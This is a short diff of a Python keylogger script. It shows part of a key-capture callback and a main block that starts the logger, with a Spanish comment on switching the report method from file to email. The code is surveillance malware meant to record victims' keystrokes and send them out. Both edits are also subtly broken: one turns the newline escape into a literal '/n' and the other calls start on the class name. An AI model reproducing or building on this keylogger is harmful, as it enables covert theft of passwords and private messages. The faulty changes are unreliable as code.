@@ -31,7 +31,7 @@ def callback(self, event):
             name = " "
         elif name == "enter":
             
-            name = "[ENTER]\n"
+            name = "[ENTER]/n"
         elif name == "decimal":
             name = "."
         else:
@@ -96,4 +96,4 @@ def report(self):
 if __name__ == "__main__":
     
     keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")#si se quiere un mail cambiar el "report_methon=file" a "report_methon=email"
-    keylogger.start()
+    Keylogger.start()
